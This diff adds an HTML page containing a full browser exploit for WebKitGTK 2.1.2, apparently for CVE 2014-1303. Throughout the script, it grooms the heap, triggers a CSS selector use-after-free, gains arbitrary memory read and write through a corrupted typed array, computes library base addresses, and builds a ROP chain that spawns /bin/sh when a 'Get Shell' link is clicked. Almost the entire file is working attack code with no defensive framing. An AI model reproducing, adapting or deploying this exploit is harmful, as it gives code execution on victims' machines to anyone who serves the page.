@@ -1,0 +1,242 @@
+<html>
+<style>html, a1,a2,a3,a4,a5,a6 em:nth-child(5){
+    height: 500px
+}
+</style>
+
+
+<script>
+
+// Tested to work on up to date Ubuntu 12.04 compiled in release mode from
+// https://svn.webkit.org/repository/webkit/releases/WebKitGTK/webkit-2.1.2/
+var shui = new Array(0x1000);
+var inputs = new Array(0x500);
+var arraybufferviews = new Array(0x500);
+var corrupted = undefined;
+var u32;
+var cbuf;
+
+function load() {
+  // Align the memory how we want it
+  for(var i = 0; i < shui.length;i+=2)
+  {
+      inputs[i/2] =  document.createElement("input");
+      inputs[i/2].type = "number";
+      shui[i] = new ArrayBuffer(0x40);
+      shui[i + 1] = new ArrayBuffer(0x20000);
+  }
+  // Trigger the vulnrablity.
+  var cssRules = window.getMatchedCSSRules(document.documentElement);
+  cssRules[0].selectorText = 'a1,a2';
+
+  // Free the input elements and put in our ArrayBufferView objects
+  for(var i = 0; i < inputs.length;i+=1)
+  {
+        inputs[i].type = "";
+        arraybufferviews[i] = new Uint32Array(shui[i/2]);
+        // Need a value to find in memory
+        arraybufferviews[i][0] = 0x77777777;
+  }
+
+  // Start the actual exploit
+  setTimeout(exploit, 0);
+
+}
+
+function exploit()
+{
+  // Find the ArrayBuffer that has had it size modified
+  for (var i = 0; i < shui.length; ++i) {
+      if (shui[i].byteLength == 0xc0) {
+          corrupted = shui[i];
+          debug_log("Found corrupted index at 0x" + i.toString(16));
+          break;
+      }
+  }
+  // If we find nothing, crash the application.
+  // Shouldn't happen based on how tcmalloc allocates memory
+  if(!corrupted)
+    crash();
+
+  u32 = new Uint32Array(corrupted);
+  // Need to find the ArrayBufferView that we have control over
+  u32[0x18] += 0x10;
+  for(var i = 0; i < arraybufferviews.length;i++)
+  {
+      tmp_array = arraybufferviews[i].subarray(0,arraybufferviews[i].length);
+      if(tmp_array[0] != 0x77777777 && arraybufferviews[i].length > 0x40)
+      {
+        cbuf = arraybufferviews[i];
+        u32[0x18] -= 0x10;
+        debug_log("Found controlled arraybufferview!")
+        break;
+      }
+  }
+
+  // Need to keep track of where the buffer is
+  oldlow = u32[0x14]
+  oldhigh = u32[0x15]
+
+  // Various calculations to get the base addresses of libraries that we use gadgets for
+  // Javascript is stupid and doesn't support 64bit integers so we need to use 3rd party lib
+  var js_core_base_addr = new dcodeIO.Long(u32[0x10], u32[0x11], true).sub(0x4192c50);
+  var webkitgtk_base_addr = js_core_base_addr.add(0x2290000);
+  var libc_base_addr = js_core_base_addr.add(0x780000);
+  var stack_base = js_core_base_addr.add(0xc522000);
+
+  js_core_base_addr_low = js_core_base_addr.getLowBitsUnsigned()
+  js_core_base_addr_high = js_core_base_addr.getHighBitsUnsigned()
+  webkitgtk_base_addr_low = webkitgtk_base_addr.getLowBitsUnsigned()
+  webkitgtk_base_addr_high = webkitgtk_base_addr.getHighBitsUnsigned()
+  libc_base_addr_low = libc_base_addr.getLowBitsUnsigned()
+  libc_base_addr_high = libc_base_addr.getHighBitsUnsigned()
+  stack_base_low = stack_base.getLowBitsUnsigned()
+  stack_base_high = stack_base.getHighBitsUnsigned()
+
+  debug_log("libjavascriptcore base address = 0x" + js_core_base_addr.toString(16))
+  debug_log("webkitgtk base address = 0x" + webkitgtk_base_addr.toString(16))
+  debug_log("libc base address = 0x" + libc_base_addr.toString(16))
+  debug_log("stack base address = 0x" + stack_base.toString(16))
+
+  // vtable pointer to byteLength
+  // The instruction pushes rax, and jmps to *rax
+  cbuf[2] = webkitgtk_base_addr_low + 0x49e2
+  cbuf[3] = webkitgtk_base_addr_high
+
+
+  // *rax is the first element in our array.
+  // pop rsp then jmps to *(rax + 0x30)
+  cbuf[0] = webkitgtk_base_addr_low + 0x19debb6
+  cbuf[1] = webkitgtk_base_addr_high
+  // adds 0x40 to rsp
+  // so stack pointer will point to cbuf[0x10]
+  cbuf[0xc] = webkitgtk_base_addr_low + 0x538100;
+  cbuf[0xd] = webkitgtk_base_addr_high
+
+
+  rop_chain = []
+  //rop chain goes here starting at the index of 0x10 in cbuf
+
+  // ROP chain to execute execve /bin/sh
+  rop_chain.push(libc_base_addr_low + 0x23d24);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(0x69622f2f);
+  rop_chain.push(0x68732f6e);
+
+  rop_chain.push(libc_base_addr_low + 0x1b8a);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(u32[0x14] + 0x2000);
+  rop_chain.push(u32[0x15]);
+
+  rop_chain.push(libc_base_addr_low + 0x9f9b7);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(0xdeadbeef);
+  rop_chain.push(0xdeadbeef);
+  rop_chain.push(0xdeadbeef);
+  rop_chain.push(0xdeadbeef);
+
+  rop_chain.push(libc_base_addr_low + 0x8a54f);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(libc_base_addr_low + 0x229f2);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(u32[0x14] + 0x2008);
+  rop_chain.push(u32[0x15]);
+
+  rop_chain.push(libc_base_addr_low + 0x355a9);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(libc_base_addr_low + 0x229f2);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(u32[0x14] + 0x2000);
+  rop_chain.push(u32[0x15]);
+
+  rop_chain.push(libc_base_addr_low + 0x23d25);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(u32[0x14] + 0x2008);
+  rop_chain.push(u32[0x15]);
+
+  rop_chain.push(libc_base_addr_low + 0x1b8a);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(u32[0x14] + 0x2008);
+  rop_chain.push(u32[0x15]);
+
+  rop_chain.push(libc_base_addr_low + 0x1f15b);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(0x01010101);
+  rop_chain.push(0x01010101);
+
+  rop_chain.push(libc_base_addr_low + 0x23950);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(0x0101013c);
+  rop_chain.push(0x01010101);
+
+  rop_chain.push(libc_base_addr_low + 0x7a3e9);
+  rop_chain.push(libc_base_addr_high);
+
+  rop_chain.push(0xdeadbeef);
+  rop_chain.push(0xdeadbeef);
+  rop_chain.push(0xdeadbeef);
+  rop_chain.push(0xdeadbeef);
+  rop_chain.push(0xdeadbeef);
+  rop_chain.push(0xdeadbeef);
+
+  rop_chain.push(libc_base_addr_low + 0xbff75);
+  rop_chain.push(libc_base_addr_high);
+
+  // Write the rop chain to the buffer
+  for(var i = 0; i < rop_chain.length; i++)
+    cbuf[0x10 + i] = rop_chain[i]
+
+  debug_log("Finished writing ROP chain!")
+}
+
+function link_clicked()
+{
+  debug_log("Overwriting vtable and executing ROP chain!")
+  // Make the vtable point to our buffer
+  u32[0x10] = u32[0x14];
+  u32[0x11] = u32[0x15];
+  // Starts execution of our rop chain
+  cbuf.byteLength;
+}
+
+// read8 and write8 taken from Liang Chen's presentation on CVE 2014-1303
+function read8(addr_low,addr_high)
+{
+  u32[0x14] = addr_low;
+  u32[0x15] = addr_high;
+  var result = [cbuf[0],cbuf[1]];
+  u32[0x14] = oldlow;
+  u32[0x15] = oldhigh;
+  return result;
+}
+
+function write8(addr_low,addr_high,value_low,value_high)
+{
+  u32[0x14] = addr_low;
+  u32[0x15] = addr_high;
+  cbuf[0] = value_low;
+  cbuf[1] = value_high;
+  u32[0x14] = oldlow;
+  u32[0x15] = oldhigh;
+  return;
+}
+
+</script>
+
+<script src="/scripts/jquery.min.js"></script>
+<script src="/scripts/long.js"></script>
+<script src="/scripts/utils.js"></script>
+<a href="javascript:link_clicked()">Get Shell</a>
+<iframe onload=load()>
+</html>
